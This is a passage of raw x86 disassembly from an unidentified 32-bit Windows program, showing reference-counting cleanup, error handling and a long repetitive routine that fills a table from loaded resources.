  405745:	add    esi,0x2
  405748:	mov    DWORD PTR [ebp-0x28],esi
  40574b:	jmp    0x4056b3
  405750:	push   0x0
  405752:	push   0x0
  405754:	push   0xf
  405756:	push   edi
  405757:	call   DWORD PTR ds:0x412028
  40575d:	mov    edi,eax
  40575f:	mov    DWORD PTR [ebp-0x28],edi
  405762:	test   edi,edi
  405764:	jne    0x40576e
  405766:	mov    BYTE PTR [ebp-0x4],al
  405769:	jmp    0x405873
  40576e:	lea    esi,[edi+0x2]
  405771:	push   esi
  405772:	lea    ecx,[ebp-0x20]
  405775:	call   DWORD PTR ds:0x4121c8
  40577b:	mov    ecx,eax
  40577d:	mov    DWORD PTR [ebp-0x24],ecx
  405780:	add    esi,esi
  405782:	mov    DWORD PTR [ebp-0x44],esi
  405785:	mov    DWORD PTR [ebp-0x40],eax
  405788:	test   esi,esi
  40578a:	je     0x405799
  40578c:	mov    BYTE PTR [eax],0x0
  40578f:	inc    eax
  405790:	mov    DWORD PTR [ebp-0x40],eax
  405793:	dec    esi
  405794:	mov    DWORD PTR [ebp-0x44],esi
  405797:	jmp    0x405788
  405799:	push   edi
  40579a:	push   ecx
  40579b:	push   0xf
  40579d:	mov    esi,0x400
  4057a2:	push   esi
  4057a3:	call   DWORD PTR ds:0x412028
  4057a9:	push   0xffffffff
  4057ab:	lea    ecx,[ebp-0x1c]
  4057ae:	call   DWORD PTR ds:0x4121dc
  4057b4:	push   0xffffffff
  4057b6:	lea    ecx,[ebp-0x20]
  4057b9:	call   DWORD PTR ds:0x4121dc
  4057bf:	mov    DWORD PTR [ebp-0x4],0x1
  4057c6:	mov    BYTE PTR [ebp-0x4],0x6
  4057ca:	xor    eax,eax
  4057cc:	mov    DWORD PTR [ebp-0x78],eax
  4057cf:	mov    DWORD PTR [ebp-0x74],eax
  4057d2:	mov    DWORD PTR [ebp-0x64],eax
  4057d5:	mov    DWORD PTR [ebp-0x70],ebx
  4057d8:	mov    DWORD PTR [ebp-0x6c],0x40188c
  4057df:	lea    ecx,[ebp-0x20]
  4057e2:	call   DWORD PTR ds:0x4121b8
  4057e8:	mov    eax,DWORD PTR [eax+0x4]
  4057eb:	push   eax
  4057ec:	lea    ecx,[ebp-0x20]
  4057ef:	call   DWORD PTR ds:0x4121d4
  4057f5:	mov    DWORD PTR [ebp-0x68],eax
  4057f8:	xor    ecx,ecx
  4057fa:	push   ecx
  4057fb:	push   ecx
  4057fc:	lea    eax,[ebp-0x78]
  4057ff:	push   eax
  405800:	mov    ebx,DWORD PTR [ebp-0x48]
  405803:	push   ebx
  405804:	push   ecx
  405805:	push   esi
  405806:	call   DWORD PTR ds:0x412024
  40580c:	mov    esi,eax
  40580e:	lea    eax,[esi+0x1]
  405811:	push   eax
  405812:	mov    ecx,DWORD PTR [ebp-0x4c]
  405815:	call   DWORD PTR ds:0x4121c8
  40581b:	push   esi
  40581c:	push   eax
  40581d:	lea    eax,[ebp-0x78]
  405820:	push   eax
  405821:	push   ebx
  405822:	push   0x0
  405824:	push   0x400
  405829:	call   DWORD PTR ds:0x412024
  40582f:	push   0xffffffff
  405831:	mov    ecx,DWORD PTR [ebp-0x4c]
  405834:	call   DWORD PTR ds:0x4121dc
  40583a:	and    DWORD PTR [ebp-0x4],0x0
  40583e:	lea    ecx,[ebp-0x20]
  405841:	call   DWORD PTR ds:0x4121c0
  405847:	or     DWORD PTR [ebp-0x4],0xffffffff
  40584b:	lea    ecx,[ebp-0x1c]
  40584e:	call   DWORD PTR ds:0x4121c0
  405854:	xor    eax,eax
  405856:	inc    eax
  405857:	jmp    0x40588b
  405859:	push   0x8007000e
  40585e:	call   DWORD PTR ds:0x412014
  405864:	call   0x4095c0
  405869:	mov    eax,0x40586f
  40586e:	ret    
  40586f:	and    DWORD PTR [ebp-0x4],0x0
  405873:	lea    ecx,[ebp-0x20]
  405876:	call   DWORD PTR ds:0x4121c0
  40587c:	or     DWORD PTR [ebp-0x4],0xffffffff
  405880:	lea    ecx,[ebp-0x1c]
  405883:	call   DWORD PTR ds:0x4121c0
  405889:	xor    eax,eax
  40588b:	call   0x40ea03
  405890:	ret    
  405891:	push   0x8007000e
  405896:	call   DWORD PTR ds:0x412014
  40589c:	call   0x4095c0
  4058a1:	mov    eax,0x40586f
  4058a6:	ret    
  4058a7:	int3   
  4058a8:	int3   
  4058a9:	int3   
  4058aa:	int3   
  4058ab:	int3   
  4058ac:	mov    edi,edi
  4058ae:	push   ebp
  4058af:	mov    ebp,esp
  4058b1:	push   ecx
  4058b2:	push   esi
  4058b3:	push   edi
  4058b4:	mov    edi,ecx
  4058b6:	mov    esi,DWORD PTR [edi]
  4058b8:	test   esi,esi
  4058ba:	je     0x4058f8
  4058bc:	or     eax,0xffffffff
  4058bf:	lock xadd DWORD PTR [esi+0x8],eax
  4058c4:	dec    eax
  4058c5:	jne    0x4058f5
  4058c7:	test   esi,esi
  4058c9:	je     0x4058f5
  4058cb:	cmp    DWORD PTR [esi],0x0
  4058ce:	je     0x4058db
  4058d0:	push   DWORD PTR [esi]
  4058d2:	call   DWORD PTR ds:0x412104
  4058d8:	and    DWORD PTR [esi],0x0
  4058db:	cmp    DWORD PTR [esi+0x4],0x0
  4058df:	je     0x4058ee
  4058e1:	push   DWORD PTR [esi+0x4]
  4058e4:	call   0x40df9b
  4058e9:	and    DWORD PTR [esi+0x4],0x0
  4058ed:	pop    ecx
  4058ee:	push   esi
  4058ef:	call   0x40df9b
  4058f4:	pop    ecx
  4058f5:	and    DWORD PTR [edi],0x0
  4058f8:	pop    edi
  4058f9:	pop    esi
  4058fa:	mov    esp,ebp
  4058fc:	pop    ebp
  4058fd:	ret    
  4058fe:	int3   
  4058ff:	int3   
  405900:	int3   
  405901:	int3   
  405902:	int3   
  405903:	jmp    0x4058ac
  405908:	int3   
  405909:	int3   
  40590a:	int3   
  40590b:	int3   
  40590c:	int3   
  40590d:	mov    edi,edi
  40590f:	push   ebp
  405910:	mov    ebp,esp
  405912:	push   esi
  405913:	push   DWORD PTR [ebp+0x8]
  405916:	mov    esi,ecx
  405918:	and    DWORD PTR [esi+0x4],0x0
  40591c:	mov    DWORD PTR [esi+0x8],0x1
  405923:	call   DWORD PTR ds:0x412100
  405929:	mov    DWORD PTR [esi],eax
  40592b:	test   eax,eax
  40592d:	jne    0x405934
  40592f:	cmp    DWORD PTR [ebp+0x8],eax
  405932:	jne    0x40593b
  405934:	mov    eax,esi
  405936:	pop    esi
  405937:	pop    ebp
  405938:	ret    0x4
  40593b:	mov    ecx,0x8007000e
  405940:	call   0x4090c8
  405945:	int3   
  405946:	int3   
  405947:	int3   
  405948:	int3   
  405949:	int3   
  40594a:	int3   
  40594b:	push   0x4
  40594d:	mov    eax,0x40f182
  405952:	call   0x40ea44
  405957:	mov    esi,ecx
  405959:	push   0xc
  40595b:	call   0x40dfa5
  405960:	pop    ecx
  405961:	mov    ecx,eax
  405963:	mov    DWORD PTR [ebp-0x10],ecx
  405966:	xor    eax,eax
  405968:	mov    DWORD PTR [ebp-0x4],eax
  40596b:	test   ecx,ecx
  40596d:	je     0x405977
  40596f:	push   DWORD PTR [ebp+0x8]
  405972:	call   0x40590d
  405977:	or     DWORD PTR [ebp-0x4],0xffffffff
  40597b:	mov    DWORD PTR [esi],eax
  40597d:	test   eax,eax
  40597f:	jne    0x40598b
  405981:	mov    ecx,0x8007000e
  405986:	call   0x4090c8
  40598b:	mov    eax,esi
  40598d:	call   0x40ea03
  405992:	ret    0x4
  405995:	int3   
  405996:	int3   
  405997:	int3   
  405998:	int3   
  405999:	int3   
  40599a:	push   0x8
  40599c:	mov    eax,0x40f1cf
  4059a1:	call   0x40ea7c
  4059a6:	mov    edi,ecx
  4059a8:	mov    DWORD PTR [ebp-0x14],edi
  4059ab:	mov    DWORD PTR [ebp-0x4],0x3
  4059b2:	cmp    DWORD PTR [edi+0x3c],0x1
  4059b6:	jne    0x4059c0
  4059b8:	push   ecx
  4059b9:	mov    ecx,DWORD PTR [edi]
  4059bb:	call   0x40be1f
  4059c0:	lea    esi,[edi+0x30]
  4059c3:	xor    ebx,ebx
  4059c5:	cmp    DWORD PTR [esi],ebx
  4059c7:	je     0x4059d2
  4059c9:	mov    ecx,esi
  4059cb:	call   0x40b196
  4059d0:	mov    DWORD PTR [esi],ebx
  4059d2:	mov    ecx,DWORD PTR [edi+0xc]
  4059d5:	test   ecx,ecx
  4059d7:	je     0x4059ec
  4059d9:	mov    eax,DWORD PTR [ecx]
  4059db:	push   ecx
  4059dc:	mov    esi,DWORD PTR [eax+0x8]
  4059df:	mov    ecx,esi
  4059e1:	call   DWORD PTR ds:0x41228c
  4059e7:	call   esi
  4059e9:	mov    DWORD PTR [edi+0xc],ebx
  4059ec:	mov    ecx,DWORD PTR [edi+0x10]
  4059ef:	test   ecx,ecx
  4059f1:	je     0x405a06
  4059f3:	mov    eax,DWORD PTR [ecx]
  4059f5:	push   ecx
  4059f6:	mov    esi,DWORD PTR [eax+0x8]
  4059f9:	mov    ecx,esi
  4059fb:	call   DWORD PTR ds:0x41228c
  405a01:	call   esi
  405a03:	mov    DWORD PTR [edi+0x10],ebx
  405a06:	lea    ecx,[edi+0x34]
  405a09:	call   0x40aa69
  405a0e:	call   DWORD PTR ds:0x412184
  405a14:	mov    BYTE PTR [ebp-0x4],0x2
  405a18:	lea    ecx,[edi+0x40]
  405a1b:	call   DWORD PTR ds:0x4121c0
  405a21:	mov    BYTE PTR [ebp-0x4],0x1
  405a25:	lea    ecx,[edi+0x8]
  405a28:	call   DWORD PTR ds:0x4121c0
  405a2e:	mov    BYTE PTR [ebp-0x4],bl
  405a31:	lea    ecx,[edi+0x4]
  405a34:	call   DWORD PTR ds:0x4121c0
  405a3a:	or     DWORD PTR [ebp-0x4],0xffffffff
  405a3e:	mov    ecx,edi
  405a40:	call   DWORD PTR ds:0x4121c0
  405a46:	call   0x40ea1c
  405a4b:	ret    
  405a4c:	int3   
  405a4d:	int3   
  405a4e:	int3   
  405a4f:	int3   
  405a50:	int3   
  405a51:	mov    edi,edi
  405a53:	push   ebx
  405a54:	push   esi
  405a55:	mov    esi,ecx
  405a57:	push   edi
  405a58:	cmp    DWORD PTR [esi+0x30],0x0
  405a5c:	jne    0x405b04
  405a62:	call   0x40b124
  405a67:	mov    DWORD PTR [esi+0x30],eax
  405a6a:	test   eax,eax
  405a6c:	jne    0x405a85
  405a6e:	push   0x8007000e
  405a73:	call   DWORD PTR ds:0x412014
  405a79:	call   0x4095c0
  405a7e:	xor    eax,eax
  405a80:	jmp    0x405b93
  405a85:	xor    edx,edx
  405a87:	mov    ecx,eax
  405a89:	call   0x40b36e
  405a8e:	xor    edi,edi
  405a90:	cmp    edi,0xe
  405a93:	je     0x405ad6
  405a95:	cmp    edi,0x1b
  405a98:	je     0x405ad6
  405a9a:	cmp    edi,0x1d
  405a9d:	jbe    0x405aa4
  405a9f:	cmp    edi,0x20
  405aa2:	jbe    0x405ad6
  405aa4:	mov    ecx,0x138d
  405aa9:	call   0x4098dc
  405aae:	mov    ecx,DWORD PTR [esi+0x30]
  405ab1:	xor    edx,edx
  405ab3:	push   0x0
  405ab5:	mov    ebx,eax
  405ab7:	call   0x40aeb4
  405abc:	test   eax,eax
  405abe:	je     0x405afe
  405ac0:	cmp    DWORD PTR [eax+0x4],0x80000
  405ac7:	jne    0x405afe
  405ac9:	push   ecx
  405aca:	mov    ecx,DWORD PTR [eax+0xc]
  405acd:	mov    edx,ebx
  405acf:	call   0x40b1ba
  405ad4:	jmp    0x405afe
  405ad6:	call   0x40b124
  405adb:	mov    ebx,eax
  405add:	test   ebx,ebx
  405adf:	je     0x405a6e
  405ae1:	push   ecx
  405ae2:	mov    ecx,0x138d
  405ae7:	call   0x4098dc
  405aec:	mov    edx,eax
  405aee:	mov    ecx,ebx
  405af0:	call   0x40b1ba
  405af5:	mov    ecx,DWORD PTR [esi+0x30]
  405af8:	push   ebx
  405af9:	call   0x40b9c6
  405afe:	inc    edi
  405aff:	cmp    edi,0x21
  405b02:	jb     0x405a90
  405b04:	mov    ecx,esi
  405b06:	call   0x405b9c
  405b0b:	test   eax,eax
  405b0d:	je     0x405a7e
  405b13:	and    DWORD PTR [esi+0x14],0x0
  405b17:	lea    edi,[esi+0x18]
  405b1a:	push   0x16
  405b1c:	pop    ecx
  405b1d:	mov    eax,edi
  405b1f:	mov    BYTE PTR [eax],0x0
  405b22:	inc    eax
  405b23:	sub    ecx,0x1
  405b26:	jne    0x405b1f
  405b28:	xor    ebx,ebx
  405b2a:	inc    ebx
  405b2b:	push   ebx
  405b2c:	call   0x40e9c1
  405b31:	pop    ecx
  405b32:	mov    ecx,eax
  405b34:	call   0x40a167
  405b39:	cmp    eax,ebx
  405b3b:	jne    0x405b41
  405b3d:	push   0xfffffff5
  405b3f:	jmp    0x405b56
  405b41:	push   0x2
  405b43:	call   0x40e9c1
  405b48:	pop    ecx
  405b49:	mov    ecx,eax
  405b4b:	call   0x40a167
  405b50:	cmp    eax,ebx
  405b52:	jne    0x405b5f
  405b54:	push   0xfffffff4
  405b56:	call   DWORD PTR ds:0x41202c
  405b5c:	mov    DWORD PTR [esi+0x14],eax
  405b5f:	cmp    DWORD PTR [esi+0x14],0x0
  405b63:	je     0x405b6f
  405b65:	push   edi
  405b66:	push   DWORD PTR [esi+0x14]
  405b69:	call   DWORD PTR ds:0x4120c8
  405b6f:	lea    ecx,[esi+0xc]
  405b72:	call   0x406659
  405b77:	test   eax,eax
  405b79:	je     0x405a7e
  405b7f:	push   0x0
  405b81:	call   DWORD PTR ds:0x412014
  405b87:	mov    ecx,0x40188c
  405b8c:	call   0x4094c8
  405b91:	mov    eax,ebx
  405b93:	pop    edi
  405b94:	pop    esi
  405b95:	pop    ebx
  405b96:	ret    
  405b97:	int3   
  405b98:	int3   
  405b99:	int3   
  405b9a:	int3   
  405b9b:	int3   
  405b9c:	push   0x4
  405b9e:	mov    eax,0x40f202
  405ba3:	call   0x40ea44
  405ba8:	mov    edi,ecx
  405baa:	mov    esi,0x5514
  405baf:	mov    ecx,esi
  405bb1:	call   0x40ab1d
  405bb6:	mov    DWORD PTR [edi+0x34],eax
  405bb9:	test   eax,eax
  405bbb:	jne    0x405c24
  405bbd:	push   0x8007000e
  405bc2:	call   DWORD PTR ds:0x412014
  405bc8:	call   0x4095c0
  405bcd:	lea    ecx,[ebp-0x10]
  405bd0:	call   DWORD PTR ds:0x4121c4
  405bd6:	and    DWORD PTR [ebp-0x4],0x0
  405bda:	call   0x4094a3
  405bdf:	push   eax
  405be0:	mov    ecx,0x1389
  405be5:	call   0x4098dc
  405bea:	push   eax
  405beb:	lea    eax,[ebp-0x10]
  405bee:	push   0x401334
  405bf3:	push   eax
  405bf4:	call   DWORD PTR ds:0x4121b4
  405bfa:	mov    esi,DWORD PTR [ebp-0x10]
  405bfd:	push   0x2
  405bff:	call   0x40e9c1
  405c04:	add    esp,0x14
  405c07:	mov    edx,esi
  405c09:	mov    ecx,eax
  405c0b:	call   0x40a377
  405c10:	or     DWORD PTR [ebp-0x4],0xffffffff
  405c14:	lea    ecx,[ebp-0x10]
  405c17:	call   DWORD PTR ds:0x4121c0
  405c1d:	xor    eax,eax
  405c1f:	jmp    0x406428
  405c24:	mov    BYTE PTR [eax],0x0
  405c27:	inc    eax
  405c28:	sub    esi,0x1
  405c2b:	jne    0x405c24
  405c2d:	mov    esi,DWORD PTR [edi+0x34]
  405c30:	mov    ecx,0xc9
  405c35:	call   0x4098dc
  405c3a:	mov    ecx,eax
  405c3c:	call   0x409aea
  405c41:	push   0x10
  405c43:	pop    ebx
  405c44:	push   0xfe
  405c49:	mov    ecx,0x97
  405c4e:	mov    DWORD PTR [esi+0x200],eax
  405c54:	mov    DWORD PTR [esi+0x204],ebx
  405c5a:	call   0x4098dc
  405c5f:	mov    edx,eax
  405c61:	mov    ecx,esi
  405c63:	call   0x40a26c
  405c68:	mov    esi,DWORD PTR [edi+0x34]
  405c6b:	mov    ecx,0xca
  405c70:	call   0x4098dc
  405c75:	mov    ecx,eax
  405c77:	call   0x409aea
  405c7c:	push   0xfe
  405c81:	mov    ecx,0x98
  405c86:	mov    DWORD PTR [esi+0x494],eax
  405c8c:	mov    DWORD PTR [esi+0x498],ebx
  405c92:	call   0x4098dc
  405c97:	mov    edx,eax
  405c99:	lea    ecx,[esi+0x294]
  405c9f:	call   0x40a26c
  405ca4:	mov    esi,DWORD PTR [edi+0x34]
  405ca7:	mov    ecx,0xcb
  405cac:	call   0x4098dc
  405cb1:	mov    ecx,eax
  405cb3:	call   0x409aea
  405cb8:	push   0xfe
  405cbd:	mov    ecx,0x99
  405cc2:	mov    DWORD PTR [esi+0x728],eax
  405cc8:	mov    DWORD PTR [esi+0x72c],ebx
  405cce:	call   0x4098dc
  405cd3:	mov    edx,eax
  405cd5:	lea    ecx,[esi+0x528]
  405cdb:	call   0x40a26c
  405ce0:	mov    esi,DWORD PTR [edi+0x34]
  405ce3:	mov    ecx,0xcc
  405ce8:	call   0x4098dc
  405ced:	mov    ecx,eax
  405cef:	call   0x409aea
  405cf4:	push   0xfe
  405cf9:	mov    ecx,0x9a
  405cfe:	mov    DWORD PTR [esi+0x9bc],eax
  405d04:	mov    DWORD PTR [esi+0x9c0],ebx
  405d0a:	call   0x4098dc
  405d0f:	mov    edx,eax
  405d11:	lea    ecx,[esi+0x7bc]
  405d17:	call   0x40a26c
  405d1c:	mov    esi,DWORD PTR [edi+0x34]
  405d1f:	mov    ecx,0xcd
  405d24:	call   0x4098dc
  405d29:	mov    ecx,eax
  405d2b:	call   0x409aea
  405d30:	push   0xfe
  405d35:	mov    ecx,0x9b
  405d3a:	mov    DWORD PTR [esi+0xc50],eax
  405d40:	mov    DWORD PTR [esi+0xc54],ebx
  405d46:	call   0x4098dc
  405d4b:	mov    edx,eax
  405d4d:	lea    ecx,[esi+0xa50]
  405d53:	call   0x40a26c
  405d58:	mov    esi,DWORD PTR [edi+0x34]
  405d5b:	mov    ecx,0xce
  405d60:	call   0x4098dc
  405d65:	mov    ecx,eax
  405d67:	call   0x409aea
  405d6c:	push   0xfe
  405d71:	mov    ecx,0x9c
  405d76:	mov    DWORD PTR [esi+0xee4],eax
  405d7c:	mov    DWORD PTR [esi+0xee8],ebx
  405d82:	call   0x4098dc
  405d87:	mov    edx,eax
  405d89:	lea    ecx,[esi+0xce4]
  405d8f:	call   0x40a26c
  405d94:	mov    esi,DWORD PTR [edi+0x34]
  405d97:	mov    ecx,0xcf
  405d9c:	call   0x4098dc
  405da1:	mov    ecx,eax
  405da3:	call   0x409aea
  405da8:	push   0xfe
  405dad:	mov    ecx,0x9d
  405db2:	mov    DWORD PTR [esi+0x1178],eax
  405db8:	mov    DWORD PTR [esi+0x117c],ebx
  405dbe:	call   0x4098dc
  405dc3:	mov    edx,eax
  405dc5:	lea    ecx,[esi+0xf78]
  405dcb:	call   0x40a26c
  405dd0:	mov    esi,DWORD PTR [edi+0x34]
  405dd3:	mov    ecx,0xd0
  405dd8:	call   0x4098dc
  405ddd:	mov    ecx,eax
  405ddf:	call   0x409aea
  405de4:	push   0xfe
  405de9:	mov    ecx,0x9e
  405dee:	mov    DWORD PTR [esi+0x140c],eax
  405df4:	mov    DWORD PTR [esi+0x1410],ebx
  405dfa:	call   0x4098dc
  405dff:	mov    edx,eax
  405e01:	lea    ecx,[esi+0x120c]
  405e07:	call   0x40a26c
  405e0c:	mov    esi,DWORD PTR [edi+0x34]
  405e0f:	mov    ecx,0xd1
  405e14:	call   0x4098dc
  405e19:	mov    ecx,eax
  405e1b:	call   0x409aea
  405e20:	push   0xfe
  405e25:	mov    ecx,0x9f
  405e2a:	mov    DWORD PTR [esi+0x16a0],eax
  405e30:	mov    DWORD PTR [esi+0x16a4],ebx
  405e36:	call   0x4098dc
  405e3b:	mov    edx,eax
  405e3d:	lea    ecx,[esi+0x14a0]
  405e43:	call   0x40a26c
  405e48:	mov    esi,DWORD PTR [edi+0x34]
  405e4b:	mov    ecx,0xd2
  405e50:	call   0x4098dc
  405e55:	mov    ecx,eax
  405e57:	call   0x409aea
  405e5c:	push   0xfe
  405e61:	mov    ecx,0xa0
  405e66:	mov    DWORD PTR [esi+0x1934],eax
  405e6c:	mov    DWORD PTR [esi+0x1938],ebx
  405e72:	call   0x4098dc
  405e77:	mov    edx,eax
  405e79:	lea    ecx,[esi+0x1734]
  405e7f:	call   0x40a26c
  405e84:	mov    esi,DWORD PTR [edi+0x34]
  405e87:	mov    ecx,0xd3
  405e8c:	call   0x4098dc
  405e91:	mov    ecx,eax
  405e93:	call   0x409aea
  405e98:	push   0xfe
  405e9d:	mov    ecx,0xa1
  405ea2:	mov    DWORD PTR [esi+0x1bc8],eax
  405ea8:	mov    DWORD PTR [esi+0x1bcc],ebx
  405eae:	call   0x4098dc
  405eb3:	mov    edx,eax
  405eb5:	lea    ecx,[esi+0x19c8]
  405ebb:	call   0x40a26c
  405ec0:	mov    esi,DWORD PTR [edi+0x34]
  405ec3:	mov    ecx,0xd4
  405ec8:	call   0x4098dc
  405ecd:	mov    ecx,eax
  405ecf:	call   0x409aea
  405ed4:	push   0xfe
  405ed9:	mov    ecx,0xa2
  405ede:	mov    DWORD PTR [esi+0x1e5c],eax
  405ee4:	mov    DWORD PTR [esi+0x1e60],ebx
  405eea:	call   0x4098dc
  405eef:	mov    edx,eax
  405ef1:	lea    ecx,[esi+0x1c5c]
  405ef7:	call   0x40a26c
  405efc:	mov    esi,DWORD PTR [edi+0x34]
  405eff:	mov    ecx,0xd5
  405f04:	call   0x4098dc
  405f09:	mov    ecx,eax
  405f0b:	call   0x409aea
  405f10:	push   0xfe
  405f15:	mov    ecx,0xa3
  405f1a:	mov    DWORD PTR [esi+0x20f0],eax
  405f20:	mov    DWORD PTR [esi+0x20f4],ebx
  405f26:	call   0x4098dc
  405f2b:	mov    edx,eax
  405f2d:	lea    ecx,[esi+0x1ef0]
  405f33:	call   0x40a26c
  405f38:	mov    esi,DWORD PTR [edi+0x34]
  405f3b:	mov    ecx,0xd6
  405f40:	call   0x4098dc
  405f45:	mov    ecx,eax
  405f47:	call   0x409aea
  405f4c:	push   0xfe
  405f51:	mov    ecx,0xa4
  405f56:	mov    DWORD PTR [esi+0x2384],eax
  405f5c:	mov    DWORD PTR [esi+0x2388],ebx
  405f62:	call   0x4098dc
  405f67:	mov    edx,eax
  405f69:	lea    ecx,[esi+0x2184]
  405f6f:	call   0x40a26c
  405f74:	mov    esi,DWORD PTR [edi+0x34]
  405f77:	mov    ecx,0xd7
  405f7c:	call   0x4098dc
  405f81:	mov    ecx,eax
  405f83:	call   0x409aea
  405f88:	mov    ebx,0x4010
  405f8d:	mov    DWORD PTR [esi+0x2618],eax
  405f93:	push   0xfe
  405f98:	mov    ecx,0xa5
  405f9d:	mov    DWORD PTR [esi+0x261c],ebx
  405fa3:	call   0x4098dc
  405fa8:	mov    edx,eax
  405faa:	lea    ecx,[esi+0x2418]
  405fb0:	call   0x40a26c
  405fb5:	mov    esi,DWORD PTR [edi+0x34]
  405fb8:	mov    ecx,0xd8
  405fbd:	call   0x4098dc
  405fc2:	mov    ecx,eax
  405fc4:	call   0x409aea
  405fc9:	push   0xfe
  405fce:	mov    ecx,0xa6
  405fd3:	mov    DWORD PTR [esi+0x28ac],eax
  405fd9:	mov    DWORD PTR [esi+0x28b0],0x10
  405fe3:	call   0x4098dc
  405fe8:	mov    edx,eax
  405fea:	lea    ecx,[esi+0x26ac]
  405ff0:	call   0x40a26c
  405ff5:	mov    esi,DWORD PTR [edi+0x34]
  405ff8:	mov    ecx,0xd9
  405ffd:	call   0x4098dc
  406002:	mov    ecx,eax
  406004:	call   0x409aea
  406009:	push   0xfe
  40600e:	mov    ecx,0xa7
  406013:	mov    DWORD PTR [esi+0x2b40],eax
  406019:	mov    DWORD PTR [esi+0x2b44],0x10
  406023:	call   0x4098dc
  406028:	mov    edx,eax
  40602a:	lea    ecx,[esi+0x2940]
  406030:	call   0x40a26c
  406035:	mov    esi,DWORD PTR [edi+0x34]
  406038:	mov    ecx,0xda
  40603d:	call   0x4098dc
  406042:	mov    ecx,eax
  406044:	call   0x409aea
  406049:	push   0xfe
  40604e:	mov    ecx,0xa8
  406053:	mov    DWORD PTR [esi+0x2dd4],eax
  406059:	mov    DWORD PTR [esi+0x2dd8],0x10
  406063:	call   0x4098dc
  406068:	mov    edx,eax
  40606a:	lea    ecx,[esi+0x2bd4]
  406070:	call   0x40a26c
  406075:	mov    esi,DWORD PTR [edi+0x34]
  406078:	mov    ecx,0xdb
  40607d:	call   0x4098dc
  406082:	mov    ecx,eax
  406084:	call   0x409aea
  406089:	mov    DWORD PTR [esi+0x3068],eax
  40608f:	push   0xfe
  406094:	mov    ecx,0xa9
  406099:	mov    DWORD PTR [esi+0x306c],0x10
  4060a3:	call   0x4098dc
  4060a8:	mov    edx,eax
  4060aa:	lea    ecx,[esi+0x2e68]
  4060b0:	call   0x40a26c
  4060b5:	mov    esi,DWORD PTR [edi+0x34]
  4060b8:	mov    ecx,0xdc
  4060bd:	call   0x4098dc
  4060c2:	mov    ecx,eax
  4060c4:	call   0x409aea
  4060c9:	push   0xfe
  4060ce:	mov    ecx,0xaa
  4060d3:	mov    DWORD PTR [esi+0x32fc],eax
  4060d9:	mov    DWORD PTR [esi+0x3300],0x10
  4060e3:	call   0x4098dc
  4060e8:	mov    edx,eax
  4060ea:	lea    ecx,[esi+0x30fc]
  4060f0:	call   0x40a26c
  4060f5:	mov    esi,DWORD PTR [edi+0x34]
  4060f8:	mov    ecx,0xdd
  4060fd:	call   0x4098dc
  406102:	mov    ecx,eax
  406104:	call   0x409aea
  406109:	push   0xfe
  40610e:	mov    ecx,0xab
  406113:	mov    DWORD PTR [esi+0x3590],eax
  406119:	mov    DWORD PTR [esi+0x3594],0x10
  406123:	call   0x4098dc
  406128:	mov    edx,eax
  40612a:	lea    ecx,[esi+0x3390]
  406130:	call   0x40a26c
  406135:	mov    esi,DWORD PTR [edi+0x34]
  406138:	mov    ecx,0xde
  40613d:	call   0x4098dc
  406142:	mov    ecx,eax
  406144:	call   0x409aea
  406149:	push   0xfe
  40614e:	mov    ecx,0xac
  406153:	mov    DWORD PTR [esi+0x3824],eax
  406159:	mov    DWORD PTR [esi+0x3828],0x10
  406163:	call   0x4098dc
  406168:	mov    edx,eax
  40616a:	lea    ecx,[esi+0x3624]
  406170:	call   0x40a26c
  406175:	mov    esi,DWORD PTR [edi+0x34]
  406178:	mov    ecx,0xdf
  40617d:	call   0x4098dc
  406182:	mov    ecx,eax
  406184:	call   0x409aea
  406189:	push   0xfe
  40618e:	mov    ecx,0xad
  406193:	mov    DWORD PTR [esi+0x3ab8],eax
  406199:	mov    DWORD PTR [esi+0x3abc],0x10
  4061a3:	call   0x4098dc
  4061a8:	mov    edx,eax
  4061aa:	lea    ecx,[esi+0x38b8]
  4061b0:	call   0x40a26c
  4061b5:	mov    esi,DWORD PTR [edi+0x34]
  4061b8:	mov    ecx,0xe0
  4061bd:	call   0x4098dc
  4061c2:	mov    ecx,eax
  4061c4:	call   0x409aea
  4061c9:	push   0xfe
  4061ce:	mov    ecx,0xae
  4061d3:	mov    DWORD PTR [esi+0x3d4c],eax
  4061d9:	mov    DWORD PTR [esi+0x3d50],0x10
  4061e3:	call   0x4098dc
  4061e8:	mov    edx,eax
  4061ea:	lea    ecx,[esi+0x3b4c]
  4061f0:	call   0x40a26c
  4061f5:	mov    esi,DWORD PTR [edi+0x34]
  4061f8:	mov    ecx,0xe1
  4061fd:	call   0x4098dc
  406202:	mov    ecx,eax
  406204:	call   0x409aea
  406209:	mov    DWORD PTR [esi+0x3fe0],eax
  40620f:	mov    ecx,0xaf
  406214:	mov    DWORD PTR [esi+0x3fe4],0x10
  40621e:	push   0xfe
  406223:	call   0x4098dc
  406228:	mov    edx,eax
  40622a:	lea    ecx,[esi+0x3de0]
  406230:	call   0x40a26c
  406235:	mov    esi,DWORD PTR [edi+0x34]
  406238:	mov    ecx,0xe2
  40623d:	call   0x4098dc
  406242:	mov    ecx,eax
  406244:	call   0x409aea
  406249:	push   0xfe
  40624e:	mov    ecx,0xb0
  406253:	mov    DWORD PTR [esi+0x4274],eax
  406259:	mov    DWORD PTR [esi+0x4278],0x10
  406263:	call   0x4098dc
  406268:	mov    edx,eax
  40626a:	lea    ecx,[esi+0x4074]
  406270:	call   0x40a26c
  406275:	mov    esi,DWORD PTR [edi+0x34]
  406278:	mov    ecx,0xe3
  40627d:	call   0x4098dc
  406282:	mov    ecx,eax
  406284:	call   0x409aea
  406289:	push   0xfe
  40628e:	mov    ecx,0xb1
  406293:	mov    DWORD PTR [esi+0x4508],eax
  406299:	mov    DWORD PTR [esi+0x450c],0x10
  4062a3:	call   0x4098dc
  4062a8:	mov    edx,eax
  4062aa:	lea    ecx,[esi+0x4308]
  4062b0:	call   0x40a26c
  4062b5:	mov    esi,DWORD PTR [edi+0x34]
  4062b8:	mov    ecx,0xe4
  4062bd:	call   0x4098dc
  4062c2:	mov    ecx,eax
  4062c4:	call   0x409aea
  4062c9:	push   0xfe
  4062ce:	mov    ecx,0xb2
  4062d3:	mov    DWORD PTR [esi+0x479c],eax
  4062d9:	mov    DWORD PTR [esi+0x47a0],ebx
  4062df:	call   0x4098dc
  4062e4:	mov    edx,eax
  4062e6:	lea    ecx,[esi+0x459c]
  4062ec:	call   0x40a26c
  4062f1:	mov    esi,DWORD PTR [edi+0x34]
  4062f4:	mov    ecx,0xe5
  4062f9:	call   0x4098dc
  4062fe:	mov    ecx,eax
  406300:	call   0x409aea
  406305:	push   0xfe
  40630a:	mov    ecx,0xb3
  40630f:	mov    DWORD PTR [esi+0x4a30],eax
  406315:	mov    DWORD PTR [esi+0x4a34],0x10
